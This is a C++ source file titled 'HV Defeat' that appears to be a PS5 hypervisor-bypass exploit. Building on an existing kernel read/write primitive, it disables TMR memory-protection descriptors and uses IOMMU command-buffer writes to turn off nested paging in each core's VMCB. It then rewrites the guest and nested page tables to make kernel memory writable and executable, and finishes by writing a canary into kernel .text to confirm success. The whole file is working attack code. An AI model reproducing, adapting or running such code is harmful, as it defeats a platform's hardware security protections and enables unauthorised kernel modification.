#include "hv_offsets.h"

#include <chrono>
#include <cstdint>
#include <cstdio>
#include <cstring>
#include <fcntl.h>
#include <setjmp.h>
#include <signal.h>
#include <sys/cpuset.h>
#include <unistd.h>

#include <ps5/kernel.h>

extern "C" int cpuset(cpusetid_t *);

// ---------------------------------------------------------------------------
// DMAP physical memory access via kernel_copyin / kernel_copyout
// ---------------------------------------------------------------------------
static uint64_t s_dmap_base;

static uint64_t dmap(uint64_t pa) { return s_dmap_base + pa; }

static int phys_read(uint64_t pa, void* buf, size_t len) {
    return kernel_copyout(static_cast<intptr_t>(dmap(pa)), buf, len);
}

static int phys_write(uint64_t pa, const void* buf, size_t len) {
    return kernel_copyin(buf, static_cast<intptr_t>(dmap(pa)), len);
}

static uint32_t phys_r32(uint64_t pa) {
    uint32_t v = 0;
    phys_read(pa, &v, 4);
    return v;
}

static void phys_w32(uint64_t pa, uint32_t v) {
    phys_write(pa, &v, 4);
}

static uint64_t phys_r64(uint64_t pa) {
    uint64_t v = 0;
    phys_read(pa, &v, 8);
    return v;
}

// ---------------------------------------------------------------------------
// Kernel VA read/write helpers
// ---------------------------------------------------------------------------
static uint64_t kread8(uint64_t kva) {
    uint64_t v = 0;
    kernel_copyout(static_cast<intptr_t>(kva), &v, 8);
    return v;
}

static void kwrite8(uint64_t kva, uint64_t v) {
    kernel_copyin(&v, static_cast<intptr_t>(kva), 8);
}

// ---------------------------------------------------------------------------
// TMR indirect register access
// ---------------------------------------------------------------------------
static constexpr uint32_t TMR_ADDR = 0xF00C2080;
static constexpr uint32_t TMR_DATA = 0xF00C2084;
static constexpr uint32_t TMR_VALID = 0x1;
static constexpr uint32_t TMR_PERMISSIVE = 0x3F07;

struct TmrDesc { uint32_t base, size, config; };

static uint32_t tmr_rr(uint32_t off) { phys_w32(TMR_ADDR, off); return phys_r32(TMR_DATA); }
static void     tmr_wr(uint32_t off, uint32_t v) { phys_w32(TMR_ADDR, off); phys_w32(TMR_DATA, v); }

static TmrDesc tmr_read(int idx) {
    return { tmr_rr(idx*16+0), tmr_rr(idx*16+4), tmr_rr(idx*16+8) };
}

static bool tmr_set_config(int idx, uint32_t v) {
    tmr_wr(idx*16+8, v);
    return tmr_rr(idx*16+8) == v;
}

// ---------------------------------------------------------------------------
// TMR defeat
// ---------------------------------------------------------------------------
static void tmr_defeat(uint32_t fw) {
    uint8_t major = (fw >> 24) & 0xFF;

    struct T { int idx; const char* name; uint8_t min_major; };
    static constexpr T targets[] = {
        {16, "Kernel",     0},
        {5,  "Hypervisor", 3},
        {17, "Hypervisor", 3},
    };

    printf("[tmr] Defeating TMR descriptors\n");
    for (auto& t : targets) {
        if (major < t.min_major) continue;

        auto d = tmr_read(t.idx);
        if (d.base == 0) {
            printf("  TMR[%d] (%s) base=0, skip\n", t.idx, t.name);
            continue;
        }
        if (!(d.config & TMR_VALID)) {
            printf("  TMR[%d] (%s) not valid, skip\n", t.idx, t.name);
            continue;
        }

        bool ok = tmr_set_config(t.idx, TMR_PERMISSIVE);
        printf("  TMR[%d/%s] base=%#010x cfg=%#06x -> %#06x %s\n",
               t.idx, t.name, d.base << 16, d.config,
               tmr_read(t.idx).config, ok ? "OK" : "FAIL");
    }
}

// ---------------------------------------------------------------------------
// IOMMU completion-wait-store: physical writes that bypass NPT
// ---------------------------------------------------------------------------
static constexpr uint32_t IOMMU_MMIO_CB_HEAD = 0xE000;
static constexpr uint32_t IOMMU_MMIO_CB_TAIL = 0xE008;
static constexpr uint32_t IOMMU_CB_SIZE      = 0x2000;
static constexpr uint32_t IOMMU_CB_MASK      = IOMMU_CB_SIZE - 1;
static constexpr uint32_t IOMMU_CMD_SIZE     = 0x10;
static constexpr uint32_t IOMMU_SC_MMIO_VA   = 0x40;
static constexpr uint32_t IOMMU_SC_CB_PTR    = 0x80;
static constexpr uint32_t IOMMU_SC_CB_INDEX  = 0x88;

struct IommuCtx {
    uint64_t cb_base;
    uint64_t mmio_va;
    uint64_t cb_index_kva;
};

static int iommu_init(IommuCtx* ctx, const HvFwOffsets* fw) {
    if (!fw->iommu_softc) {
        printf("[iommu] no softc offset\n");
        return -1;
    }

    uint64_t softc = kread8(static_cast<uint64_t>(KERNEL_ADDRESS_TEXT_BASE) +
                            fw->iommu_softc);
    if (!softc) {
        printf("[iommu] softc ptr is NULL\n");
        return -2;
    }

    ctx->mmio_va      = kread8(softc + IOMMU_SC_MMIO_VA);
    ctx->cb_base      = kread8(softc + IOMMU_SC_CB_PTR);
    ctx->cb_index_kva = softc + IOMMU_SC_CB_INDEX;

    if (!ctx->cb_base || !ctx->mmio_va) {
        printf("[iommu] not initialized (cb=%#lx mmio=%#lx)\n",
               static_cast<unsigned long>(ctx->cb_base),
               static_cast<unsigned long>(ctx->mmio_va));
        return -3;
    }

    printf("[iommu] softc=%#lx cb=%#lx mmio=%#lx\n",
           static_cast<unsigned long>(softc),
           static_cast<unsigned long>(ctx->cb_base),
           static_cast<unsigned long>(ctx->mmio_va));
    return 0;
}

static void iommu_submit_cmd(IommuCtx* ctx, const void* cmd) {
    uint64_t tail = kread8(ctx->mmio_va + IOMMU_MMIO_CB_TAIL);
    uint64_t next = (tail + IOMMU_CMD_SIZE) & IOMMU_CB_MASK;

    kernel_copyin(cmd, static_cast<intptr_t>(ctx->cb_base + tail), IOMMU_CMD_SIZE);
    kwrite8(ctx->mmio_va + IOMMU_MMIO_CB_TAIL, next);
    kwrite8(ctx->cb_index_kva, next);

    while (kread8(ctx->mmio_va + IOMMU_MMIO_CB_HEAD) !=
           kread8(ctx->mmio_va + IOMMU_MMIO_CB_TAIL))
        ;
}

static void iommu_write8(IommuCtx* ctx, uint64_t pa, uint64_t val) {
    uint32_t cmd[4];
    cmd[0] = static_cast<uint32_t>(pa & 0xFFFFFFF8) | 0x05;
    cmd[1] = (static_cast<uint32_t>(pa >> 32) & 0xFFFFF) | 0x10000000;
    cmd[2] = static_cast<uint32_t>(val);
    cmd[3] = static_cast<uint32_t>(val >> 32);
    iommu_submit_cmd(ctx, cmd);
}

// ---------------------------------------------------------------------------
// VMCB discovery
// ---------------------------------------------------------------------------
static constexpr int MAX_CORES = 16;
static constexpr uint64_t VMCB_NP_ENABLE = 0x90;
static constexpr uint64_t VMCB_NCR3      = 0xB0;
static constexpr uint32_t VMCB_STRIDE    = 0x3000;

struct VmcbInfo {
    uint64_t pa[MAX_CORES];
    int count;
};

static int discover_vmcbs(VmcbInfo* info, const HvFwOffsets* fw) {
    info->count = 0;

    if (fw->vmcb_core0) {
        for (int c = 0; c < MAX_CORES; c++)
            info->pa[c] = fw->vmcb_core0 +
                          static_cast<uint64_t>(c) * VMCB_STRIDE;
        info->count = MAX_CORES;
        printf("[vmcb] Hardcoded core0=%#lx stride=%#x\n",
               static_cast<unsigned long>(fw->vmcb_core0), VMCB_STRIDE);
        return 0;
    }

    auto kd = tmr_read(16);
    if (kd.base == 0) {
        printf("[vmcb] TMR[16].base=0\n");
        return -1;
    }

    uint64_t hv_data = (static_cast<uint64_t>(kd.base) << 16) + fw->text_size;
    printf("[vmcb] HV data PA=%#lx\n", static_cast<unsigned long>(hv_data));

    if (!fw->hv_vcpu || !fw->hv_vcpu_cpuid) {
        printf("[vmcb] No vcpu offsets\n");
        return -1;
    }

    for (int c = 0; c < MAX_CORES; c++) {
        uint64_t ptr = hv_data + fw->hv_vcpu +
                       static_cast<uint64_t>(c) * fw->hv_vcpu_cpuid;
        uint64_t vmcb_va = phys_r64(ptr);

        if ((vmcb_va >> 48) != 0xFFFF || (vmcb_va & 0xFFF) != 0) {
            printf("[vmcb] core %d: bad VA %#lx\n", c,
                   static_cast<unsigned long>(vmcb_va));
            continue;
        }

        info->pa[info->count] = vmcb_va - s_dmap_base;
        printf("[vmcb] core %d: PA=%#lx\n", c,
               static_cast<unsigned long>(info->pa[info->count]));
        info->count++;
    }

    return info->count > 0 ? 0 : -1;
}

// ---------------------------------------------------------------------------
// flush_vms: VMMCALL on each core forces HV to reload VMCBs
// ---------------------------------------------------------------------------
static void pin_core(int c) {
    uint64_t m[2]{};
    m[0] = 1ULL << c;
    cpuset_setaffinity(3, 1, -1, 0x10,
                       reinterpret_cast<const cpuset_t*>(m));
}

static void unpin() {
    uint64_t m[2] = {0xFFFF, 0};
    cpuset_setaffinity(3, 1, -1, 0x10,
                       reinterpret_cast<const cpuset_t*>(m));
}

static void flush_vms() {
    printf("[vmmcall] Flushing VMs\n");

    static jmp_buf jmp_env;
    static volatile int faulted;

    auto old_handler = signal(SIGILL, [](int) {
        faulted = 1;
        longjmp(jmp_env, 1);
    });

    for (int i = 0; i < MAX_CORES; i++) {
        pin_core(i);
        faulted = 0;
        if (setjmp(jmp_env) == 0)
            asm volatile("vmmcall");
        printf("  core %2d: %s\n", i, faulted ? "SIGILL" : "VMEXIT");
    }

    signal(SIGILL, old_handler);
    unpin();
}

// ---------------------------------------------------------------------------
// Page table structures and walker
// ---------------------------------------------------------------------------
union PTE {
    uint64_t raw;
    struct {
        uint64_t present       : 1;
        uint64_t write         : 1;
        uint64_t user          : 1;
        uint64_t write_through : 1;
        uint64_t cache_disable : 1;
        uint64_t accessed      : 1;
        uint64_t dirty         : 1;
        uint64_t page_size     : 1;
        uint64_t global        : 1;
        uint64_t _avl          : 3;
        uint64_t pfn           : 40;
        uint64_t _res          : 6;
        uint64_t xotext        : 1;
        uint64_t pkey          : 4;
        uint64_t nx            : 1;
    };
    uint64_t addr() const { return static_cast<uint64_t>(pfn) << 12; }
};
static_assert(sizeof(PTE) == 8);

static int lvl_idx(uint64_t va, int level) {
    return static_cast<int>((va >> (12 + 9 * (level - 1))) & 0x1FF);
}

using PhysRd = int(*)(uint64_t, void*, size_t);
using PhysWr = int(*)(uint64_t, const void*, size_t);

struct PTLevel {
    uint64_t pa;
    PTE entries[512];
    bool dirty;
};

struct PTWalker {
    PhysRd rd;
    PhysWr wr;
    PTLevel L[3];

    void flush_up(int to) {
        for (int i = 0; i < to; i++) {
            if (L[i].dirty) {
                wr(L[i].pa, L[i].entries, sizeof(L[i].entries));
                L[i].dirty = false;
            }
        }
    }

    bool load(int level, uint64_t pa) {
        auto& l = L[level - 1];
        if (pa == l.pa && l.pa) return true;
        flush_up(level);
        l.pa = pa;
        return rd(pa, l.entries, sizeof(l.entries)) == 0;
    }

    void flush() { flush_up(3); }

    struct Leaf { PTE pte; uint64_t size; };

    bool patch(const PTE* pml4, uint64_t va, PTE clear, PTE set, Leaf* out) {
        auto& e4 = pml4[lvl_idx(va, 4)];
        if (!e4.present) return false;
        uint64_t next = e4.addr();

        for (int lv = 3; lv >= 1; lv--) {
            if (!load(lv, next)) return false;
            auto& entry = L[lv-1].entries[lvl_idx(va, lv)];
            if (!entry.present) return false;

            if (lv == 1 || entry.page_size) {
                uint64_t sz = lv == 1 ? 0x1000ULL : lv == 2 ? 0x200000ULL : 0x40000000ULL;
                if (out) *out = {entry, sz};
                PTE merged = {.raw = (entry.raw & ~clear.raw) | set.raw};
                if (merged.raw != entry.raw) {
                    entry = merged;
                    L[lv-1].dirty = true;
                }
                return true;
            }
            next = entry.addr();
        }
        return false;
    }
};

// ---------------------------------------------------------------------------
// Guest PTE patching (works with NPT active — guest page table pages are
// in guest-accessible memory so DMAP can walk them without trapping)
// ---------------------------------------------------------------------------
static uint64_t get_guest_pml4(const HvFwOffsets* fw) {
    uint64_t pmap = static_cast<uint64_t>(KERNEL_ADDRESS_TEXT_BASE) + fw->pmap_store;
    uint64_t va = 0;
    kernel_copyout(static_cast<intptr_t>(pmap + fw->pmap_pm_pml4), &va, sizeof(va));
    return va;
}

static int patch_guest_ptes(uint64_t guest_pml4_va,
                            uint64_t va_start, uint64_t va_end) {
    PTE g_pml4[512]{};
    if (kernel_copyout(static_cast<intptr_t>(guest_pml4_va),
                       g_pml4, sizeof(g_pml4))) {
        printf("[pt] read guest PML4 failed\n");
        return 0;
    }

    PTWalker gw{phys_read, phys_write, {}};
    PTE clear{}, set{};
    clear.xotext = 1;
    clear.nx = 1;
    set.write = 1;

    int count = 0;
    for (uint64_t va = va_start; va < va_end; va += 0x1000) {
        if (gw.patch(g_pml4, va, clear, set, nullptr))
            count++;
    }
    gw.flush();
    return count;
}

// ---------------------------------------------------------------------------
// Full NPT walk: set RW, clear XOTEXT/NX on every present entry.
// Call only after NPT is disabled so DMAP hits physical memory directly.
// ---------------------------------------------------------------------------
static int patch_npt_full(uint64_t ncr3) {
    PTE clear{}, set{};
    clear.xotext = 1;
    clear.nx = 1;
    set.write = 1;

    auto apply = [&](PTE& e) -> bool {
        PTE m;
        m.raw = (e.raw & ~clear.raw) | set.raw;
        if (m.raw == e.raw) return false;
        e = m;
        return true;
    };

    int count = 0;

    PTE pml4[512]{};
    phys_read(ncr3, pml4, sizeof(pml4));
    bool pml4_dirty = false;

    for (int i4 = 0; i4 < 512; i4++) {
        if (!pml4[i4].present) continue;
        if (pml4[i4].page_size) {
            pml4_dirty |= apply(pml4[i4]);
            count++;
            continue;
        }

        PTE pdpt[512]{};
        phys_read(pml4[i4].addr(), pdpt, sizeof(pdpt));
        bool pdpt_dirty = false;

        for (int i3 = 0; i3 < 512; i3++) {
            if (!pdpt[i3].present) continue;
            if (pdpt[i3].page_size) {
                pdpt_dirty |= apply(pdpt[i3]);
                count++;
                continue;
            }

            PTE pd[512]{};
            phys_read(pdpt[i3].addr(), pd, sizeof(pd));
            bool pd_dirty = false;

            for (int i2 = 0; i2 < 512; i2++) {
                if (!pd[i2].present) continue;
                if (pd[i2].page_size) {
                    pd_dirty |= apply(pd[i2]);
                    count++;
                    continue;
                }

                PTE pt[512]{};
                phys_read(pd[i2].addr(), pt, sizeof(pt));
                bool pt_dirty = false;

                for (int i1 = 0; i1 < 512; i1++) {
                    if (!pt[i1].present) continue;
                    pt_dirty |= apply(pt[i1]);
                    count++;
                }

                if (pt_dirty)
                    phys_write(pd[i2].addr(), pt, sizeof(pt));
            }

            if (pd_dirty)
                phys_write(pdpt[i3].addr(), pd, sizeof(pd));
        }

        if (pdpt_dirty)
            phys_write(pml4[i4].addr(), pdpt, sizeof(pdpt));
    }

    if (pml4_dirty)
        phys_write(ncr3, pml4, sizeof(pml4));

    return count;
}

// ---------------------------------------------------------------------------
// TLB flush: clear Global bit from a throw-away page, CPUID on each core
// ---------------------------------------------------------------------------
static int invalidate_tlb(uint64_t guest_pml4_va) {
    static uint8_t zeros[4096 * 2]{};
    int fds[2];
    if (pipe2(fds, O_NONBLOCK)) return -1;

    write(fds[1], zeros, sizeof(zeros));
    close(fds[1]);

    auto file_data = static_cast<uint64_t>(kernel_get_proc_file(-1, fds[0]));
    if (!(file_data & 0xFFFF000000000000ULL)) { close(fds[0]); return -1; }

    uint64_t buf_va = 0;
    kernel_copyout(static_cast<intptr_t>(file_data + 0x10), &buf_va, sizeof(buf_va));
    if (!(buf_va & 0xFFFF000000000000ULL)) { close(fds[0]); return -1; }

    PTE pml4[512]{};
    if (kernel_copyout(static_cast<intptr_t>(guest_pml4_va), pml4, sizeof(pml4))) {
        close(fds[0]);
        return -1;
    }

    PTWalker w{phys_read, phys_write, {}};
    PTE clear{};
    clear.global = 1;
    w.patch(pml4, buf_va, clear, PTE{}, nullptr);
    w.flush();

    close(fds[0]);
    return 0;
}

static void flush_tlb(uint64_t guest_pml4_va) {
    invalidate_tlb(guest_pml4_va);

    cpusetid_t new_id;
    cpuset(&new_id);
    cpuset_t mask;
    CPU_ZERO(&mask);
    mask.__bits[0] = 0xFFFF;
    cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_CPUSET, new_id, 0x8, &mask);

    for (int i = 0; i < MAX_CORES; i++) {
        pin_core(i);
        uint32_t eax = 0, ecx = 0;
        asm volatile("cpuid" : "+a"(eax), "+c"(ecx) : : "ebx", "edx");
    }

    unpin();
}

// ---------------------------------------------------------------------------
// Entry point
// ---------------------------------------------------------------------------
int main() {
    printf("\n=== HV Defeat ===\n\n");

    uint32_t fw = kernel_get_fw_version();
    printf("[init] FW %u.%02u (raw %08x)\n",
           (fw >> 24) & 0xFF, (fw >> 16) & 0xFF, fw);

    auto* off = hv_offsets_for(fw);
    if (!off) {
        printf("[init] Unsupported firmware\n");
        return 1;
    }

    uint32_t dmpml4i = 0, dmpdpi = 0;
    kernel_copyout(KERNEL_ADDRESS_TEXT_BASE + off->dmpml4i, &dmpml4i, 4);
    kernel_copyout(KERNEL_ADDRESS_TEXT_BASE + off->dmpdpi,  &dmpdpi,  4);
    s_dmap_base = (static_cast<uint64_t>(dmpdpi) << 30) |
                  (static_cast<uint64_t>(dmpml4i) << 39) |
                  0xFFFF800000000000ULL;
    printf("[init] DMAP=%#016lx\n", static_cast<unsigned long>(s_dmap_base));

    // Widen CPU affinity so we can pin to all 16 cores for VMMCALL
    cpusetid_t cpuset_id;
    cpuset(&cpuset_id);
    uint64_t all_cores[2] = {0xFFFF, 0};
    cpuset_setaffinity(3, 2, cpuset_id, 0x10,
                       reinterpret_cast<const cpuset_t*>(all_cores));

    // --- Stage 1: TMR defeat ---
    tmr_defeat(fw);

    // --- Stage 2: IOMMU init ---
    IommuCtx iommu{};
    int r = iommu_init(&iommu, off);
    if (r) {
        printf("[init] IOMMU init failed (%d)\n", r);
        return 1;
    }

    // --- Stage 3: Discover all 16 VMCBs ---
    VmcbInfo vmcbs{};
    if (discover_vmcbs(&vmcbs, off)) {
        printf("[init] VMCB discovery failed\n");
        return 1;
    }

    // --- Stage 4: IOMMU disable NPT on all VMCBs ---
    printf("[npt] Disabling NPT on %d VMCBs via IOMMU\n", vmcbs.count);
    for (int i = 0; i < vmcbs.count; i++)
        iommu_write8(&iommu, vmcbs.pa[i] + VMCB_NP_ENABLE, 0);

    // --- Stage 5: Patch guest PTEs (clear XOTEXT/NX, set RW) ---
    uint64_t pml4_va = get_guest_pml4(off);
    if (!pml4_va) {
        printf("[pt] guest PML4 VA = 0\n");
        return 1;
    }

    uint64_t va_start = static_cast<uint64_t>(KERNEL_ADDRESS_TEXT_BASE);
    uint64_t va_end   = static_cast<uint64_t>(KERNEL_ADDRESS_DATA_BASE) + 0x7000000;
    printf("[pt] Range %#016lx -> %#016lx\n",
           static_cast<unsigned long>(va_start),
           static_cast<unsigned long>(va_end));

    auto t0 = std::chrono::high_resolution_clock::now();
    int guest_count = patch_guest_ptes(pml4_va, va_start, va_end);
    auto t1 = std::chrono::high_resolution_clock::now();
    auto ms = std::chrono::duration_cast<std::chrono::milliseconds>(t1 - t0).count();
    printf("[pt] Guest: %d pages in %lldms\n",
           guest_count, static_cast<long long>(ms));

    // --- Stage 6: VMMCALL flush -> HV reloads VMCBs -> NPT is now off ---
    flush_vms();

    // --- Stage 7: TLB flush ---
    flush_tlb(pml4_va);
    printf("[tlb] Flushed\n");

    // --- Stage 8: Read nCR3 and patch entire NPT (safe: NPT is off) ---
    uint64_t ncr3 = phys_r64(vmcbs.pa[0] + VMCB_NCR3);
    printf("[npt] nCR3=%#016lx\n", static_cast<unsigned long>(ncr3));
    if (!ncr3 || (ncr3 & 0xFFF)) {
        printf("[npt] Invalid nCR3, skipping nested patch\n");
    } else {
        t0 = std::chrono::high_resolution_clock::now();
        int nested_count = patch_npt_full(ncr3);
        t1 = std::chrono::high_resolution_clock::now();
        ms = std::chrono::duration_cast<std::chrono::milliseconds>(t1 - t0).count();
        printf("[npt] Nested: %d entries in %lldms\n",
               nested_count, static_cast<long long>(ms));
    }

    // --- Stage 9: IOMMU re-enable NPT on all VMCBs ---
    printf("[npt] Re-enabling NPT\n");
    for (int i = 0; i < vmcbs.count; i++) {
        iommu_write8(&iommu, vmcbs.pa[i] + VMCB_NP_ENABLE, 0x9);
        usleep(100);
    }

    // --- Stage 10: VMMCALL flush -> NPT back on with RWX entries ---
    flush_vms();

    // --- Stage 11: Smoke test ---
    intptr_t test = KERNEL_ADDRESS_TEXT_BASE + 0xA0;
    uint64_t orig  = kernel_getlong(test);
    constexpr uint64_t canary = 0x4141414142424242ULL;
    kernel_setlong(test, canary);
    uint64_t after = kernel_getlong(test);
    kernel_setlong(test, orig);

    bool ok = after == canary;
    printf("[test] .text probe: %s (expect %016lx got %016lx)\n",
           ok ? "PASS" : "FAIL",
           static_cast<unsigned long>(canary),
           static_cast<unsigned long>(after));

    printf("\n=== HV Defeat %s ===\n\n", ok ? "SUCCESS" : "FAILED");
    return ok ? 0 : 1;
}
